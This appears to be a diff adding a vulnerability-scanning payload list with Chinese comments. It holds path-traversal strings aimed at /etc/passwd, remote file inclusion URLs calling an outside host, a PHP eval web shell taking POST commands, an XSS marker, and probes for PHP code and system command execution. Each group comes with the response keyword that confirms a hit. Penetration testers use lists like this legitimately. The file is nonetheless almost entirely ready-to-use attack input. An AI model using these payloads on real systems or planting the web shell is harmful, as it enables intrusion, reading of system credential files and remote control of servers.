@@ -1,0 +1,47 @@
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+../../../../../../../../../etc/passwd
+../etc/passwd%00
+../../etc/passwd%00
+../../../etc/passwd%00
+../../../../etc/passwd%00
+../../../../../etc/passwd%00
+../../../../../../etc/passwd%00
+../../../../../../../etc/passwd%00
+../../../../../../../../etc/passwd%00
+../../../../../../../../../etc/passwd%00
+../etc/passwd?
+../../etc/passwd?
+../../../etc/passwd?
+../../../../etc/passwd?
+../../../../../etc/passwd?
+../../../../../../etc/passwd?
+../../../../../../../etc/passwd?
+../../../../../../../../etc/passwd?
+../../../../../../../../../etc/passwd?
+#####上面是查找linux本地包含漏洞，对应关键词是root:
+http://www.y35u.com/y35u.txt
+http://www.y35u.com/y35u.txt?
+http://www.y35u.com/y35u.txt%00
+www.y35u.com/y35u.txt
+www.y35u.com/y35u.txt?
+www.y35u.com/y35u.txt%00
+#####上面是查找远程包含漏洞，URL自己换成自己的，关键词自己定义，本地址关键词是here!
+#####<?php @eval($_POST['cmd']);?> Y35U was here!
+</div>Y35Uwashere
+#####上面是查找XSS漏洞，本关键词是</div>Y35Uwashere，代码可以自行添加。
+phpinfo
+<?php phpinfo();?>
+phpinfo()
+phpinfo();
+#####上面是查找PHP代码执行漏洞，关键词是PHP Version
+ifconfig
+#####上面是查找系统命令执行漏洞，关键词是255.255
+
+
